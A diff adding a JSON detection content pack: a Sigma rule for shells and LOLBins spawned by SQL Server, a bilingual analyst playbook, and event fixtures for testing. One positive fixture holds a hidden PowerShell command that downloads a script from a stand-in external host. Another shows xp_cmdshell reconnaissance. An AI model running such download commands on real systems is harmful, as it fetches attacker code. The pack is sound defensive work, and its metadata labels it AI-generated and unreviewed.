@@ -1,0 +1,136 @@
+{
+  "rule": {
+    "id": "869b9ca7-9ea2-4a5a-8325-e80e62f75445",
+    "title": "Suspicious Child Process Of SQL Server",
+    "level": "high",
+    "status": "test",
+    "author": "FPT.EagleEye Team, wagga",
+    "path": "windows/process_creation/proc_creation_win_mssql_susp_child_process.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_mssql_susp_child_process.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1190",
+      "T1505.003"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "El proceso de SQL Server (sqlservr.exe) inició un intérprete de comandos, una herramienta de reconocimiento o un binario LOLBin. Esto suele indicar ejecución de comandos del sistema operativo mediante xp_cmdshell, a menudo tras una inyección SQL o el robo de credenciales de la base de datos.",
+      "what_it_detects": "Eventos de creación de procesos en Windows cuyo ParentImage termina en \\sqlservr.exe y cuyo Image es cmd.exe, powershell.exe, pwsh.exe, bash.exe, sh.exe, wsl.exe, bitsadmin.exe, regsvr32.exe, rundll32.exe, ping.exe, netstat.exe, nltest.exe, systeminfo.exe o tasklist.exe. Se excluye la instancia DATEV_DBENGINE cuando lanza cmd.exe con su línea de comandos habitual.",
+      "why_it_matters": "Un atacante que controla consultas SQL puede ejecutar comandos con la cuenta de servicio de SQL Server, que suele tener privilegios elevados. Corresponde a explotación de una aplicación expuesta (T1190) y a persistencia por componentes de servidor (T1505.003).",
+      "triage_steps": [
+        "Revise CommandLine del proceso hijo: busque whoami, descargas, comandos codificados, creación de usuarios o reconocimiento de red y dominio.",
+        "Identifique la cuenta (User) y la instancia en ParentImage; confirme si la cuenta de servicio es local, de dominio o tiene privilegios administrativos.",
+        "Consulte el log de errores y la auditoría de SQL Server: habilitación de xp_cmdshell vía sp_configure, inicios de sesión recientes y su origen.",
+        "Busque procesos nietos del hijo y conexiones de red salientes desde el mismo host en +/- 15 minutos.",
+        "Si una aplicación web usa esta base, revise sus logs de acceso en busca de patrones de inyección SQL desde la misma IP de origen.",
+        "Busque archivos nuevos en directorios temporales o de SQL Server y alertas previas del mismo host o cuenta.",
+        "Confirme con el equipo de base de datos si existe un job o script autorizado que explique la ejecución."
+      ],
+      "false_positives": [
+        "Scripts administrativos o de mantenimiento que usan xp_cmdshell para respaldos, copia de archivos o limpieza.",
+        "Aplicaciones de terceros (ERP, contabilidad) que invocan comandos del sistema desde procedimientos almacenados.",
+        "Herramientas de monitoreo que ejecutan ping, tasklist o netstat mediante SQL Server.",
+        "Instancias de DATEV distintas a la ruta filtrada o con línea de comandos diferente."
+      ],
+      "response_steps": [
+        "Valide con el responsable de la base de datos si la ejecución estaba autorizada antes de actuar.",
+        "Si es maliciosa, aísle el endpoint de la red y deshabilite xp_cmdshell; rote las credenciales de la cuenta de servicio y de los logins SQL implicados.",
+        "Bloquee la IP de origen y corrija la vulnerabilidad de inyección SQL en la aplicación afectada.",
+        "Elimine artefactos, usuarios o tareas creadas por el atacante tras preservar evidencia y obtener los hash.",
+        "Restaure desde una copia confiable si hay alteración de datos y refuerce el monitoreo del servidor."
+      ],
+      "severity_rationale": "Nivel alto porque sqlservr.exe rara vez lanza shells o herramientas de reconocimiento de forma legítima y esto implica ejecución de código con privilegios de servicio."
+    },
+    "en": {
+      "summary": "The SQL Server process (sqlservr.exe) launched a shell, a reconnaissance tool or a LOLBin. This usually means operating system commands ran through xp_cmdshell, often after SQL injection or stolen database credentials.",
+      "what_it_detects": "Windows process creation events where ParentImage ends with \\sqlservr.exe and Image is cmd.exe, powershell.exe, pwsh.exe, bash.exe, sh.exe, wsl.exe, bitsadmin.exe, regsvr32.exe, rundll32.exe, ping.exe, netstat.exe, nltest.exe, systeminfo.exe or tasklist.exe. The DATEV_DBENGINE instance is excluded when it launches cmd.exe with its usual command line.",
+      "why_it_matters": "An attacker who controls SQL queries can run commands as the SQL Server service account, which often has high privileges. This maps to exploiting a public-facing application (T1190) and server software component persistence (T1505.003).",
+      "triage_steps": [
+        "Review the child CommandLine: look for whoami, downloads, encoded commands, user creation, or network and domain reconnaissance.",
+        "Identify the User and the instance in ParentImage; check whether the service account is local, domain or administrative.",
+        "Check the SQL Server error log and audit: xp_cmdshell enabled via sp_configure, recent logins and their source.",
+        "Look for grandchild processes and outbound network connections from the same host within +/- 15 minutes.",
+        "If a web application uses this database, review its access logs for SQL injection patterns from the same source IP.",
+        "Look for new files in temp or SQL Server folders and earlier alerts for the same host or account.",
+        "Ask the database team whether an authorized job or script explains the execution."
+      ],
+      "false_positives": [
+        "Admin or maintenance scripts using xp_cmdshell for backups, file copies or cleanup.",
+        "Third-party applications (ERP, accounting) calling OS commands from stored procedures.",
+        "Monitoring tools running ping, tasklist or netstat through SQL Server.",
+        "DATEV instances outside the filtered path or with a different command line."
+      ],
+      "response_steps": [
+        "Confirm with the database owner whether the execution was authorized before acting.",
+        "If malicious, isolate the endpoint, disable xp_cmdshell, and rotate the service account and involved SQL login credentials.",
+        "Block the source IP and fix the SQL injection flaw in the affected application.",
+        "Remove attacker artifacts, accounts or tasks after preserving evidence and collecting hashes.",
+        "Restore from a trusted backup if data was altered and increase monitoring of the server."
+      ],
+      "severity_rationale": "High because sqlservr.exe rarely spawns shells or recon tools legitimately, and this implies code execution with service privileges."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "xp_cmdshell on a default SQL Server instance runs whoami through cmd.exe",
+        "event": {
+          "EventID": 1,
+          "Computer": "SQL-01.andes.example.com",
+          "User": "NT SERVICE\\MSSQLSERVER",
+          "ParentImage": "C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe",
+          "ParentCommandLine": "\"C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe\" -sMSSQLSERVER",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "\"C:\\Windows\\system32\\cmd.exe\" /c whoami /all",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "SQL Server spawns PowerShell to download content from an external host",
+        "event": {
+          "EventID": 1,
+          "Computer": "SQL-02.andes.example.com",
+          "User": "ANDES\\svc_sql",
+          "ParentImage": "C:\\Program Files\\Microsoft SQL Server\\MSSQL16.ERP\\MSSQL\\Binn\\sqlservr.exe",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "CommandLine": "powershell.exe -nop -w hidden -c \"iwr http://203.0.113.15/a.ps1 -OutFile C:\\Users\\Public\\a.ps1\"",
+          "IntegrityLevel": "High"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "DATEV database engine launching cmd.exe with its usual quoted command line (excluded by filter)",
+        "event": {
+          "EventID": 1,
+          "Computer": "FIN-SRV-03",
+          "User": "NT SERVICE\\MSSQL$DATEV_DBENGINE",
+          "ParentImage": "C:\\Program Files\\Microsoft SQL Server\\MSSQL15.DATEV_DBENGINE\\MSSQL\\Binn\\sqlservr.exe",
+          "Image": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "\"C:\\Windows\\system32\\cmd.exe\" /c dir \"C:\\DATEV\\DATEN\"",
+          "IntegrityLevel": "High"
+        }
+      },
+      {
+        "description": "SQL Server launching SQLDumper.exe after an exception, a child not in the list",
+        "event": {
+          "EventID": 1,
+          "Computer": "SQL-01.andes.example.com",
+          "User": "NT SERVICE\\MSSQLSERVER",
+          "ParentImage": "C:\\Program Files\\Microsoft SQL Server\\MSSQL15.MSSQLSERVER\\MSSQL\\Binn\\sqlservr.exe",
+          "Image": "C:\\Program Files\\Microsoft SQL Server\\150\\Shared\\SqlDumper.exe",
+          "CommandLine": "\"C:\\Program Files\\Microsoft SQL Server\\150\\Shared\\SqlDumper.exe\" 4120 0 0x0120",
+          "IntegrityLevel": "High"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
